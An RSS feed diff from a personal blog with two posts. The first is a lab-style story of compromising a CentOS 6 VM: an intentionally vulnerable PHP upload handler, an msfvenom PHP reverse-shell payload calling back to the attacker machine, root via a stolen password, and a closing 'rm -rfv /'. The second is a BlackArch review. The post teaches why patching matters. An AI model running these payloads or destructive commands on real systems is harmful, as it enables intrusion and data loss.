@@ -1,0 +1,389 @@
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+    <channel>
+        <title>Penetration testing - Tag - WeepingDogel</title>
+        <link>http://weepingdogel.github.io/tags/penetration-testing/</link>
+        <description>Penetration testing - Tag - WeepingDogel</description>
+        <generator>Hugo -- gohugo.io</generator><language>en</language><managingEditor>weepingdogel@gmail.com (WeepingDogel)</managingEditor>
+            <webMaster>weepingdogel@gmail.com (WeepingDogel)</webMaster><lastBuildDate>Sat, 26 Sep 2020 13:14:18 &#43;0800</lastBuildDate><atom:link href="http://weepingdogel.github.io/tags/penetration-testing/" rel="self" type="application/rss+xml" /><item>
+    <title>Attacking CentOS6 Virtual Machines</title>
+    <link>http://weepingdogel.github.io/posts/2020-09-26/</link>
+    <pubDate>Sat, 26 Sep 2020 13:14:18 &#43;0800</pubDate>
+    <author>Author</author>
+    <guid>http://weepingdogel.github.io/posts/2020-09-26/</guid>
+    <description><![CDATA[<div class="featured-image">
+                <img src="https://w.wallhaven.cc/full/5w/wallhaven-5we787.jpg" referrerpolicy="no-referrer">
+            </div><blockquote>
+<p>Although the penetration process is involved, this article&rsquo;s main topic is not about penetration testing. Please read it with a rational mindset.</p>
+</blockquote>
+<h2 id="the-reason-for-writing-this-blog-post">The reason for writing this blog post</h2>
+<p>Recently, I have been hearing different opinions on software updates. On one hand, some argue that in certain cases, updating can be counterproductive, leading to unnecessary workload or even rewriting. On the other hand, others argue that continuous updates are necessary for a better user experience.</p>
+<p>I am not sure which side is right, but I am curious. I wanted to know what would happen if I do not update software, so I took it upon myself to simulate an attack on a commercial company&rsquo;s server using a virtual machine. The system used was CentOS 6, and I attempted to use various tools to try and breach its security.</p>
+<p>My goal was to simulate what could happen if a company were to be targeted by hackers while still using CentOS 6.0 in 2020.</p>
+<h2 id="simulation-environment">Simulation Environment</h2>
+<blockquote>
+<p>Attacker platform: Arch Linux</p>
+<p>IP: 192.168.0.109</p>
+<p>Victim platform: CentOS 6.1 on VirtualBox</p>
+<p>IP: 192.168.0.116</p>
+</blockquote>
+<p><strong>Suppose</strong> this is a company where non-technical personnel lead the technical staff, and they have not updated the software used in development (including the operating system of their development machines and servers) for a long time.</p>
+<p>We can imagine this virtual machine as their server and conduct some attack tests on it. Because the management of this company is non-technical, the software on the server not only has outdated versions but also lacks any defensive measures.</p>
+<p>Additionally, due to unsatisfactory work hours, the programmers have a &ldquo;get the job done&rdquo; attitude, resulting in PHP code on the backend such as this:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;error&#34;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;Error: &#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;error&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;Uploaded file name: &#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;File type: &#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;type&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;File size: &#34;</span> <span class="o">.</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;size&#34;</span><span class="p">]</span> <span class="o">/</span> <span class="mi">1024</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34; kB&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;Temporary storage location of file: &#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">],</span> <span class="s2">&#34;upload/&#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;File stored in: &#34;</span> <span class="o">.</span> <span class="s2">&#34;upload/&#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>Although the simulation has limitations, I personally believe that it is sufficient for abstract testing purposes.</p>
+</blockquote>
+<h2 id="process-of-attack">Process of attack</h2>
+<p>Someone always likes to cause trouble, and a hacker has scanned the server&hellip;</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo nmap -O -v 192.168.0.116
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The result is as follows:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Nmap scan report for 192.168.0.116
+</span></span><span class="line"><span class="cl">Host is up (0.00028s latency).
+</span></span><span class="line"><span class="cl">Not shown: 998 closed ports
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
+</span></span><span class="line"><span class="cl">22/tcp open  ssh
+</span></span><span class="line"><span class="cl">80/tcp open  http
+</span></span><span class="line"><span class="cl">MAC Address: 08:00:27:B7:2E:E5 (Oracle VirtualBox virtual NIC)
+</span></span><span class="line"><span class="cl">Device type: general purpose
+</span></span><span class="line"><span class="cl">Running: Linux 2.6.X|3.X
+</span></span><span class="line"><span class="cl">OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
+</span></span><span class="line"><span class="cl">OS details: Linux 2.6.32 - 3.10
+</span></span><span class="line"><span class="cl">Uptime guess: 49.708 days (since Sat Aug  8 02:56:12 2020)
+</span></span><span class="line"><span class="cl">Network Distance: 1 hop
+</span></span><span class="line"><span class="cl">TCP Sequence Prediction: Difficulty=261 (Good luck!)
+</span></span><span class="line"><span class="cl">IP ID Sequence Generation: All zeros
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Read data files from: /usr/bin/../share/nmap
+</span></span><span class="line"><span class="cl">OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 2.13 seconds
+</span></span><span class="line"><span class="cl">           Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.286KB)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>He was surprised to find that the kernel version was only <code>2.6.32</code>, which was a first for him. In addition, there were open ports for SSH and HTTP, which gave him a good opportunity.</p>
+<p>He attempted to access the website and discovered a file upload point on the site.</p>
+<p></p>
+<p>With a &ldquo;let&rsquo;s give it a try&rdquo; attitude, he generated a payload using msf.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ msfvenom -p php/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.0.109 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -o shell.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>He selected a file and clicked upload, and was surprised to find that not only was the upload successful, but he was also informed of its location.
+</p>
+<p>So he launched <code>msfconsole</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ msfconsole
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And he used the exploit/multi/handler module.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">msf5 &gt; use exploit/multi/handler 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>He then proceeded to set the parameters one by one.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">msf5 exploit(multi/handler) &gt; set LHOST 192.168.0.109
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">msf5 exploit(multi/handler) &gt; set LPORT 4444
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">set payload php/meterpreter/reverse_tcp
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The final step was to run the module.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">msf5 exploit(multi/handler) &gt; run
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then msf began listening.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Started reverse TCP handler on 192.168.0.109:4444 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>At this point, he modified the file address and link as prompted and accessed it:</p>
+<blockquote>
+<p><code>http://192.168.0.116/upload/shell.php</code></p>
+</blockquote>
+<p>Msf immediately produced results. It&rsquo;s easy to imagine how poor the server&rsquo;s security measures were.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[*] Started reverse TCP handler on 192.168.0.109:4444 
+</span></span><span class="line"><span class="cl">[*] Sending stage (38288 bytes) to 192.168.0.116
+</span></span><span class="line"><span class="cl">[*] Meterpreter session 1 opened (192.168.0.109:4444 -&gt; 192.168.0.116:52350) at 2020-09-26 21:33:06 +0800
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">meterpreter &gt; 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now he began retrieving brief system information, such as the <code>operating system</code> and <code>kernel version</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">meterpreter &gt; sysinfo
+</span></span><span class="line"><span class="cl">Computer    : localhost
+</span></span><span class="line"><span class="cl">OS          : Linux localhost 2.6.32-754.33.1.el6.x86_64 #1 SMP Tue Aug 25 15:29:40 UTC 2020 x86_64
+</span></span><span class="line"><span class="cl">Meterpreter : php/linux
+</span></span><span class="line"><span class="cl">meterpreter &gt; cat /etc/issue
+</span></span><span class="line"><span class="cl">CentOS release 6.10 (Final)
+</span></span><span class="line"><span class="cl">Kernel \r on an \m
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>He also attempted to determine the current user&rsquo;s privileges.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">meterpreter &gt; getuid
+</span></span><span class="line"><span class="cl">Server username: apache (48)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The permissions are still quite low, so while he may not be able to do anything that would cause significant damage to the company, he can still spy and wreak havoc. But would the hacker be satisfied with just that? The answer is no, because he wants to escalate his privileges and obtain root access, which would allow him to do whatever he wants.</p>
+<p>Due to the fact that the system and kernel of this server are too outdated, most of the code used to exploit vulnerabilities only works on kernel versions 3.x or above, or cannot be compiled at all.</p>
+<p>It looks like he needs to think of another way.</p>
+<p>During the day, he rides his motorcycle through the streets and alleys delivering food, and at night he roams the network as a hacker.</p>
+<p>By chance, he went to deliver food ordered by an employee of that company and, as he entered the office area, he accidentally saw a note stuck to a monitor.</p>
+<p>There were some numbers and letters written on it, perhaps something useful.</p>
+<p>While the employees were eating, he secretly took a picture of the note with his phone and left.</p>
+<p>As luck would have it, this note contained the password that had just been changed and would not be updated again for a while.</p>
+<p>After work, he returned to his terminal and attempted to log in directly as root using the stolen password.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">meterpreter &gt; shell
+</span></span><span class="line"><span class="cl">Process 1376 created.
+</span></span><span class="line"><span class="cl">Channel 2 created.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>He was able to obtain an interactive shell.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">/bin/sh -i
+</span></span><span class="line"><span class="cl">sh: no job control in this shell
+</span></span><span class="line"><span class="cl">sh-4.1$ python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
+</span></span><span class="line"><span class="cl">python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
+</span></span><span class="line"><span class="cl">bash-4.1$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>He logged in successfully.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">bash-4.1$ su root
+</span></span><span class="line"><span class="cl">su root
+</span></span><span class="line"><span class="cl">Password: ************
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[root@localhost upload]# 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>As we can see, he was able to log in successfully with ease, and now he has root privileges at his fingertips.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[root@localhost upload]# whoami
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">root
+</span></span><span class="line"><span class="cl">[root@localhost upload]# id
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl">uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:system_r:httpd_t:s0
+</span></span><span class="line"><span class="cl">[root@localhost upload]# 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Yes, he could do whatever he wanted now&hellip;</p>
+<p>And so, in the end, he proceeded to delete everything.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[root@localhost upload]# rm -rfv /
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The company suffered significant losses as a result.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>Although the story above is purely fictional and the attack was only carried out in a simulated environment, it is worth pondering over what we can see&hellip;</p>
+<ul>
+<li>Systems that are not updated are prone to attacks.</li>
+<li>Code that is not updated is prone to vulnerabilities.</li>
+<li>Slow password updates can lead to leaks.</li>
+<li>Vulnerabilities must be fixed by updating software; otherwise, they will be exploited.</li>
+</ul>
+<p>And as for what we cannot see&hellip;</p>
+<p>Software is ultimately created by humans, and there is no perfection with humans. We must constantly reflect on ourselves and our creations.</p>
+<p>Whether as users or developers, updating what needs to be updated is a normal part of life. There may be differences in speed, but progress must be made. Standing still or even moving backwards is not an option.</p>
+<p>For software to be updated is like how humans need to self-reflect. If humans fail to self-reflect, their future will be bleak. If software is not updated, it will be abandoned by people and forgotten.</p>
+<p>Even worse, it could be easily destroyed by a script kiddie who delivers food, just like the joke I told earlier.</p>
+<p>The above is just my personal opinion. If there are any errors, please feel free to correct me in the comments below.</p>
+]]></description>
+</item><item>
+    <title>BlackArch Experience Report</title>
+    <link>http://weepingdogel.github.io/posts/%E5%85%B3%E4%BA%8Eblackarch%E7%9A%84%E4%BD%93%E9%AA%8C%E6%8A%A5%E5%91%8A/</link>
+    <pubDate>Sun, 16 Jun 2019 16:33:47 &#43;0800</pubDate>
+    <author>Author</author>
+    <guid>http://weepingdogel.github.io/posts/%E5%85%B3%E4%BA%8Eblackarch%E7%9A%84%E4%BD%93%E9%AA%8C%E6%8A%A5%E5%91%8A/</guid>
+    <description><![CDATA[<div class="featured-image">
+                <img src="/images/ba-slider.png" referrerpolicy="no-referrer">
+            </div><blockquote>
+<p><em>Today, I attempted to install BlackArch and spent quite a long time doing so. However, I later discovered that this system was not very perfect.</em></p>
+</blockquote>
+<h2 id="advantages">Advantages</h2>
+<p>Firstly, let&rsquo;s talk about its advantages:</p>
+<ul>
+<li>This thing integrates thousands of software packages, all of which are powerful tools.</li>
+<li>Secondly, this thing is cool, especially the wallpaper and color matching, which I think are particularly stunning.</li>
+<li>Its ease of installation is also a plus. Initially, I thought it would be more difficult to install than Arch, but after using it, I found that its installation process is ten times simpler than Arch. It&rsquo;s just that I&rsquo;m used to the manual style of Arch and not accustomed to this semi-automated approach.</li>
+</ul>
+<h2 id="disadvantages">Disadvantages</h2>
+<p>Now, let&rsquo;s talk about the disadvantages:</p>
+<ul>
+<li>First of all, the ISO is really too big. The official live ISO for BlackArch is 12GB, which took me a long time to download using IDM. The network installation package is the same size as Arch, but I haven&rsquo;t tried it.</li>
+<li>What&rsquo;s more alarming is that the minimum hard disk requirement for installing blackarch&rsquo;s official mirrors is over 40GB, which makes it difficult for most people to meet this installation condition.</li>
+<li>Secondly, its desktop environment is too basic and its performance is particularly poor, especially for i3 and spectrwm, which are impossible to operate. Fluxbox is the coolest, but its habits are not suitable for most people. Openbox has nothing, and it&rsquo;s even harder to operate. It also doesn&rsquo;t support Chinese, which is very annoying. Also, the dependencies are too messy, making it difficult to switch to other desktop environments. For example, when I wanted to uninstall others and switch to xfce, I couldn&rsquo;t uninstall them with &ldquo;pacman -Rs&rdquo;. I had to use &ldquo;Rsc&rdquo; to uninstall them, but as a result, I uninstalled &ldquo;lxdm&rdquo;, which prevented me from entering graphics mode. Later, when I installed &ldquo;lxdm&rdquo;, there was a major color bug.</li>
+</ul>
+<h2 id="conclusion">Conclusion</h2>
+<p>Firstly, it cannot be denied that BlackArch is a good thing for showing off, but I do not recommend using the official mirror (whether it is an online mirror or an offline live one) for installation, otherwise, you will end up like me. Secondly, users must have a foundation in the Arch series; otherwise, it will be a pitfall. It is recommended to install Arch first and then import BlackArch&rsquo;s software library to install the full set of tools. Finally, please do not compare BlackArch with Kali or Parrot. They are not comparable in terms of tools.</p>
+]]></description>
+</item></channel>
+</rss>
